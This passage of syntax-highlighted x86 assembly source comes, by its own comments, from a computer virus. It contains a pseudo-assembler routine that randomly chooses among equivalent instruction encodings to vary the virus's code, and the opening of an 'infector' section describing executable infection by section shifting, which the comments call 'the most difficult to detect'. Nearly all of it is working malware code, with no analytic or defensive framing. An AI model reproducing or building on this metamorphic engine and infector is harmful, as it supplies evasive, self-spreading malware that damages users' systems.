                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; Store the label of destiny</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">            </span><span class="sc1">; Increase the last element pointer</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">NumberOfJumpRelocations</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">Asm_AddToRelocTable</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc1">;; This function will construct the opcode reference to a memory address using</span><span class="sc0">
</span><span class="sc1">;; the common memory address structure of our pseudoassembler. It will recode</span><span class="sc0">
</span><span class="sc1">;; the address using randomly one of the possible codifications for every</span><span class="sc0">
</span><span class="sc1">;; situation, as I expose here:</span><span class="sc0">
</span><span class="sc1">;;</span><span class="sc0">
</span><span class="sc1">;; Memory codification variants:</span><span class="sc0">
</span><span class="sc1">;;</span><span class="sc0">
</span><span class="sc1">;; Direct address</span><span class="sc0">
</span><span class="sc1">;;     05 xx xx xx xx</span><span class="sc0">
</span><span class="sc1">;;     04 25 xx xx xx xx</span><span class="sc0">
</span><span class="sc1">;;</span><span class="sc0">
</span><span class="sc1">;; 1 index + 0</span><span class="sc0">
</span><span class="sc1">;;     0x (not valid if x = 5)</span><span class="sc0">
</span><span class="sc1">;;     4x 00</span><span class="sc0">
</span><span class="sc1">;;     8x 00 00 00 00</span><span class="sc0">
</span><span class="sc1">;;     04 00xxx101 00 00 00 00</span><span class="sc0">
</span><span class="sc1">;;     44 00100xxx 00</span><span class="sc0">
</span><span class="sc1">;;     84 00100xxx 00 00 00 00</span><span class="sc0">
</span><span class="sc1">;; 1 index + byte (&lt; 80h or &gt; FFFFFF7Fh)</span><span class="sc0">
</span><span class="sc1">;;     4x yy</span><span class="sc0">
</span><span class="sc1">;;     8x yy ss ss ss</span><span class="sc0">
</span><span class="sc1">;;     04 00xxx101 yy ss ss ss</span><span class="sc0">
</span><span class="sc1">;;     44 00100xxx yy</span><span class="sc0">
</span><span class="sc1">;;     84 00100xxx yy ss ss ss</span><span class="sc0">
</span><span class="sc1">;; 1 index + dword</span><span class="sc0">
</span><span class="sc1">;;     8x yy yy yy yy</span><span class="sc0">
</span><span class="sc1">;;     04 00xxx101 yy yy yy yy</span><span class="sc0">
</span><span class="sc1">;;     84 00100xxx yy yy yy yy</span><span class="sc0">
</span><span class="sc1">;; 1 index * N + 0</span><span class="sc0">
</span><span class="sc1">;;     04 nnxxx101 00 00 00 00</span><span class="sc0">
</span><span class="sc1">;; 1 index * N + byte</span><span class="sc0">
</span><span class="sc1">;;     04 nnxxx101 yy ss ss ss</span><span class="sc0">
</span><span class="sc1">;; 1 index * N + dword</span><span class="sc0">
</span><span class="sc1">;;     04 nnxxx101 yy yy yy yy</span><span class="sc0">
</span><span class="sc1">;;</span><span class="sc0">
</span><span class="sc1">;; 2 index + 0 (xx(*nn),yy,zzzzzzzz)</span><span class="sc0">
</span><span class="sc1">;;     04 nnxxxyyy (yyy != 5)</span><span class="sc0">
</span><span class="sc1">;;     44 nnxxxyyy 00</span><span class="sc0">
</span><span class="sc1">;;     84 nnxxxyyy 00 00 00 00</span><span class="sc0">
</span><span class="sc1">;; 2 index + byte (&lt;80h or &gt; FFFFFF7Fh) (xx(*nn),yy,zzzzzzzz)</span><span class="sc0">
</span><span class="sc1">;;     44 nnxxxyyy zz</span><span class="sc0">
</span><span class="sc1">;;     84 nnxxxyyy zz ss ss ss</span><span class="sc0">
</span><span class="sc1">;; 2 index + dword (xx(*nn),yy,zzzzzzzz)</span><span class="sc0">
</span><span class="sc1">;;     84 nnxxxyyy zz zz zz zz</span><span class="sc0">
</span><span class="sc1">;;</span><span class="sc0">
</span><span class="sc1">;; The codification of the memory address will be done at [EDI], while EBX</span><span class="sc0">
</span><span class="sc1">;; can hold a value to OR to the 1st codified opcode (for example, registers</span><span class="sc0">
</span><span class="sc1">;; or operations that must be in this opcode). The function returns with all</span><span class="sc0">
</span><span class="sc1">;; prepared to follow the codification, this means, all the pointers</span><span class="sc0">
</span><span class="sc1">;; are increased and the memory address is completely finished, not having</span><span class="sc0">
</span><span class="sc1">;; to make anything more related with the memory address.</span><span class="sc0">
</span><span class="sc1">;; </span><span class="sc0">
</span><span class="sc5">Asm_MakeMemoryAddress</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">jae</span><span class="sc0">   </span><span class="sc5">@@Next00</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@Next01</span><span class="sc0">
   </span><span class="sc5">@@Next00</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

   </span><span class="sc1">; Now, ECX &gt; EDX. ECX will hold also the multiplicator if we use one for</span><span class="sc0">
   </span><span class="sc1">; this instruction. If not, it could be exchanged with EDX further on the</span><span class="sc0">
   </span><span class="sc1">; algorithm.</span><span class="sc0">

   </span><span class="sc5">@@Next01</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">         </span><span class="sc1">; I decided to not commenting this :).</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@NoIndex1</span><span class="sc0">       </span><span class="sc1">; The code is clear and understandable,</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">         </span><span class="sc1">; and I'm tired of commenting code!</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Only1Index</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7</span><span class="sc0">
                </span><span class="sc6">ja</span><span class="sc0">    </span><span class="sc5">@@NoExchange</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">RandomBoolean</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@NoExchange</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc5">@@NoExchange</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@2Index_0</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7Fh</span><span class="sc0">
                </span><span class="sc6">jbe</span><span class="sc0">   </span><span class="sc5">@@2Index_Byte</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFFFFF80h</span><span class="sc0">
                </span><span class="sc6">jae</span><span class="sc0">   </span><span class="sc5">@@2Index_Byte</span><span class="sc0">
   </span><span class="sc5">@@2Index_Dword</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">84h</span><span class="sc0">
   </span><span class="sc5">@@2Index_Dword_Subr</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0C0h</span><span class="sc0">
                </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">38h</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@SetMemory01</span><span class="sc0">
   </span><span class="sc5">@@2Index_Byte</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">RandomBoolean</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@2Index_Dword</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">44h</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">  </span><span class="sc5">@@2Index_Dword_Subr</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">
   </span><span class="sc5">@@2Index_0</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">RandomBoolean</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@2Index_Byte</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@2Index_Byte</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">04h</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">  </span><span class="sc5">@@2Index_Dword_Subr</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

   </span><span class="sc5">@@Only1Index</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc1">; EDX = Index, no scalar (if not, it would be ECX)</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Only1Index_0</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7Fh</span><span class="sc0">
                </span><span class="sc6">jbe</span><span class="sc0">   </span><span class="sc5">@@Only1Index_Byte</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFFFFF80h</span><span class="sc0">
                </span><span class="sc6">jae</span><span class="sc0">   </span><span class="sc5">@@Only1Index_Byte</span><span class="sc0">
   </span><span class="sc5">@@Only1Index_Dword</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Random</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Only1Index_Dword</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Only1Index_Dword_01</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Only1Index_Dword_02</span><span class="sc0">
   </span><span class="sc5">@@Only1Index_Dword_03</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">84h</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">20h</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@SetMemory01</span><span class="sc0">
   </span><span class="sc5">@@Only1Index_Dword_02</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">04h</span><span class="sc0">
                </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@SetMemory01</span><span class="sc0">
   </span><span class="sc5">@@Only1Index_Dword_01</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">80h</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">
   </span><span class="sc5">@@Only1Index_Byte</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">RandomBoolean</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Only1Index_Dword</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">RandomBoolean</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Only1Index_Byte_01</span><span class="sc0">
   </span><span class="sc5">@@Only1Index_Byte_02</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">44h</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">20h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">
   </span><span class="sc5">@@Only1Index_Byte_01</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">40h</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">
   </span><span class="sc5">@@Only1Index_0</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">RandomBoolean</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Only1Index_Byte</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Only1Index_Byte</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

   </span><span class="sc5">@@NoIndex1</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">   </span><span class="sc1">; If EDX = 8, then ECX &gt;= 8</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@DirectAddress</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0C0h</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7</span><span class="sc0">
                </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
   </span><span class="sc5">@@SetMemory01</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">6</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">
   </span><span class="sc5">@@DirectAddress</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">05h</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">Asm_MakeMemoryAddress</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">
</span><span class="sc1">;;</span><span class="sc0">
</span><span class="sc1">;;</span><span class="sc0">
</span><span class="sc1">;; End of the assembler</span><span class="sc0">
</span><span class="sc1">;;</span><span class="sc0">
</span><span class="sc1">;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;</span><span class="sc0">


</span><span class="sc1">;; KEYWORD: Key_!Infector</span><span class="sc0">
</span><span class="sc1">;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;</span><span class="sc0">
</span><span class="sc1">;;; ********************************************************************** ;;;</span><span class="sc0">
</span><span class="sc1">;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;</span><span class="sc0">
</span><span class="sc1">;;</span><span class="sc0">
</span><span class="sc1">;; The infector</span><span class="sc0">
</span><span class="sc1">;; ------------</span><span class="sc0">
</span><span class="sc1">;;</span><span class="sc0">
</span><span class="sc1">;; The infector is the part that brings this virus the category of "virus" :).</span><span class="sc0">
</span><span class="sc1">;; The infection made here is quite complex: there are three types of</span><span class="sc0">
</span><span class="sc1">;; supported modes, depending on the configuration of the executable:</span><span class="sc0">
</span><span class="sc1">;;</span><span class="sc0">
</span><span class="sc1">;; 1) Midinfection with section shifting</span><span class="sc0">
</span><span class="sc1">;;</span><span class="sc0">
</span><span class="sc1">;;   The most difficult to make but also the most difficult to detect. It</span><span class="sc0">
</span><span class="sc1">;;   can only be performed if there is a .reloc section in the executable.</span><span class="sc0">
